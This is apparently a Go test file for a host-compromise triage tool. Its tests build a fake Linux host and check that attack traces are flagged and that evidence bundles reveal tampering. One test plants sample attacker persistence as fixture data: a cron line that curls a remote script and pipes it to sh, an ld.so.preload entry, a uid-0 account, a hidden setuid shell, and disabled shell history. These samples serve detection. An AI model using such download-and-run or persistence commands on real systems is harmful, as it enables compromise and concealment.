package triage

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/seolcu/hostveil/internal/check/checktest"
	"github.com/seolcu/hostveil/internal/platform"
)

var testNow = time.Date(2026, 10, 25, 3, 0, 0, 0, time.UTC)

type fakeHost struct {
	t    *testing.T
	root string
	r    *checktest.Runner
}

func newFakeHost(t *testing.T) *fakeHost {
	h := &fakeHost{t: t, root: t.TempDir(), r: checktest.New()}
	h.write("/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\nalice:x:1000:1000::/home/alice:/bin/bash\n")
	h.write("/etc/shadow", "root:!:20000::::::\nalice:$6$hash:20000::::::\n")
	h.write("/home/alice/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl alice@laptop\n")
	return h
}

func (h *fakeHost) write(p, content string) {
	h.t.Helper()
	full := filepath.Join(h.root, p)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		h.t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
		h.t.Fatal(err)
	}
}

func (h *fakeHost) run() (*Result, string, string) {
	h.t.Helper()
	out := filepath.Join(h.t.TempDir(), "bundle")
	res, _, seal, err := Run(context.Background(), Options{
		Out: out, Since: 30 * 24 * time.Hour, Root: h.root, Version: "test",
		Now: func() time.Time { return testNow },
	}, platform.Env{ServiceManager: platform.SMSystemd, Runner: h.r})
	if err != nil {
		h.t.Fatal(err)
	}
	return res, out, seal
}

func verdicts(res *Result) map[string]Verdict {
	out := map[string]Verdict{}
	for _, in := range res.Indicators {
		out[in.ID] = in.Verdict
	}
	return out
}

func authLines(lines ...string) string { return strings.Join(lines, "\n") + "\n" }

func TestACleanHostShowsOnlyAttempts(t *testing.T) {
	h := newFakeHost(t)
	var guesses []string
	for i := 0; i < 40; i++ {
		guesses = append(guesses, "2026-10-20T10:00:00.000000+09:00 host sshd[9]: Failed password for invalid user admin from 203.0.113.9 port 4000 ssh2")
	}
	guesses = append(guesses, "2026-10-21T09:00:00.000000+09:00 host sshd[9]: Accepted publickey for alice from 100.64.0.2 port 5000 ssh2: ED25519 SHA256:ls4/tZpF0qS/nBsKFl3AhfdYxHK4Qgkzx9gWz2M5p2M")
	h.write("/var/log/auth.log", authLines(guesses...))
	var web []string
	for i := 0; i < 30; i++ {
		web = append(web, `198.51.100.7 - - [20/Oct/2026:10:00:00 +0900] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0"`)
	}
	h.write("/var/log/apache2/access.log", authLines(web...))

	res, _, _ := h.run()
	v := verdicts(res)
	if v["ssh.guessing"] != Attempt || v["web.scanning"] != Attempt {
		t.Errorf("attempts not reported: %v", v)
	}
	for id, verdict := range v {
		if verdict == Compromise {
			t.Errorf("clean host reported %s as a compromise", id)
		}
	}
}

func TestTracesOfACompromiseAreReported(t *testing.T) {
	h := newFakeHost(t)
	var auth []string
	for i := 0; i < 8; i++ {
		auth = append(auth, "2026-10-22T01:00:00.000000+09:00 host sshd[9]: Failed password for alice from 192.0.2.50 port 4000 ssh2")
	}
	auth = append(auth, "2026-10-22T01:01:00.000000+09:00 host sshd[9]: Accepted password for alice from 192.0.2.50 port 4001 ssh2")
	h.write("/var/log/auth.log", authLines(auth...))
	h.write("/var/log/apache2/access.log", authLines(
		`192.0.2.60 - - [22/Oct/2026:02:00:00 +0900] "POST /uploads/avatar.php HTTP/1.1" 200 12 "-" "curl/8"`,
		`192.0.2.60 - - [22/Oct/2026:02:00:05 +0900] "GET /.git/config HTTP/1.1" 200 300 "-" "curl/8"`,
	))
	h.write("/var/log/audit/audit.log", `type=SYSCALL msg=audit(1792602005.100:200): arch=c000003e syscall=59 success=yes exit=0 ppid=800 pid=801 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm="sh" exe="/usr/bin/dash" subj=unconfined key="hostveil-svc-exec"`+"\n")
	h.write("/etc/cron.d/sync", "*/5 * * * * root curl -fsS http://203.0.113.5/s | sh\n")
	h.write("/etc/ld.so.preload", "/usr/lib/x86_64-linux-gnu/libsync.so\n")
	h.write("/etc/passwd", "root:x:0:0:root:/root:/bin/bash\ntoor:x:0:0::/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\nalice:x:1000:1000::/home/alice:/bin/bash\n")
	h.write("/tmp/.cache/sh", "")
	if err := os.Chmod(filepath.Join(h.root, "tmp/.cache/sh"), os.ModeSetuid|0o755); err != nil {
		t.Fatal(err)
	}
	h.write("/etc/systemd/system/sync.service", "[Service]\nExecStart=/bin/true\n")
	old := testNow.Add(-200 * 24 * time.Hour)
	_ = os.Chtimes(filepath.Join(h.root, "etc/systemd/system/sync.service"), old, old)
	if err := os.Symlink("/dev/null", filepath.Join(h.root, "home/alice/.bash_history")); err != nil {
		t.Fatal(err)
	}
	h.r.Script("  801   800 www-data                             12 sh -c id\n", "ps", "-eo", "pid=,ppid=,user:32=,etimes=,args=")
	h.r.Script("??5??????   /usr/bin/ls\n??5?????? c /etc/ssh/sshd_config\n", "dpkg", "--verify")

	res, _, _ := h.run()
	v := verdicts(res)
	for id, want := range map[string]Verdict{
		"ssh.login-after-guessing":        Compromise,
		"web.script-in-upload-dir":        Compromise,
		"web.probe-answered":              Suspicious,
		"audit.webuser-exec":              Compromise,
		"process.webuser-shell":           Compromise,
		"persistence.download-and-run":    Compromise,
		"persistence.ld-preload":          Compromise,
		"account.uid0":                    Compromise,
		"integrity.setuid-unpackaged":     Compromise,
		"integrity.package-file-modified": Compromise,
		"antiforensic.history-disabled":   Suspicious,
	} {
		if v[id] != want {
			t.Errorf("%s = %q, want %q", id, v[id], want)
		}
	}
	if len(res.Timeline) == 0 {
		t.Error("empty timeline")
	}
}

func TestGapsComeFromReadiness(t *testing.T) {
	h := newFakeHost(t)
	h.write("/usr/sbin/apache2", "")
	h.r.Script("LoadState=not-found\nActiveState=inactive\n", "systemctl", "show", "auditd.service", "--property=LoadState,ActiveState")
	res, _, _ := h.run()
	found := false
	for _, g := range res.Gaps {
		if g.Finding == "forensic.auditd-missing" {
			found = true
		}
	}
	if !found {
		t.Errorf("no gap for a host without auditd: %+v", res.Gaps)
	}
}

func TestVerifyCatchesTampering(t *testing.T) {
	h := newFakeHost(t)
	h.write("/var/log/auth.log", "2026-10-20T10:00:00+09:00 host sshd[9]: Failed password for root from 203.0.113.9 port 1 ssh2\n")
	_, out, seal := h.run()

	v, err := Verify(out)
	if err != nil || !v.OK() {
		t.Fatalf("fresh bundle does not verify: %+v %v", v, err)
	}
	if v.Seal != seal {
		t.Error("verify reports a different manifest hash than collection printed")
	}
	p := filepath.Join(out, "artifacts/files/var/log/auth.log")
	_ = os.Chmod(p, 0o600)
	if err := os.WriteFile(p, []byte("nothing to see\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	_ = os.WriteFile(filepath.Join(out, "planted.txt"), []byte("x"), 0o600)
	v, _ = Verify(out)
	if v.OK() || len(v.Mismatch) != 1 || len(v.Extra) != 1 {
		t.Errorf("tampering not caught: %+v", v)
	}
}

func TestCollectionNeverWritesOutsideTheBundle(t *testing.T) {
	h := newFakeHost(t)
	before := snapshot(t, h.root)
	h.run()
	if after := snapshot(t, h.root); after != before {
		t.Error("the host tree changed during collection")
	}
}

func snapshot(t *testing.T, root string) string {
	var b strings.Builder
	_ = filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
		if err == nil {
			b.WriteString(p + " " + info.Mode().String() + " " + info.ModTime().String() + "\n")
		}
		return nil
	})
	return b.String()
}

func TestRefusesToWriteOverABundle(t *testing.T) {
	h := newFakeHost(t)
	out := t.TempDir()
	_ = os.WriteFile(filepath.Join(out, "x"), nil, 0o600)
	if _, err := Collect(context.Background(), Options{Out: out, Root: h.root, Runner: h.r}); err == nil {
		t.Error("wrote into a non-empty directory")
	}
}

func TestLogTime(t *testing.T) {
	now := time.Date(2026, 1, 3, 0, 0, 0, 0, time.UTC)
	if got := logTime("Dec 30 10:00:00 host sshd[1]: x", now); got.Year() != 2025 {
		t.Errorf("year rollover: %v", got)
	}
	if got := logTime("2026-01-02T10:00:00.123456+09:00 host sshd[1]: x", now); !got.Equal(time.Date(2026, 1, 2, 1, 0, 0, 123456000, time.UTC)) {
		t.Errorf("rfc3339: %v", got)
	}
}
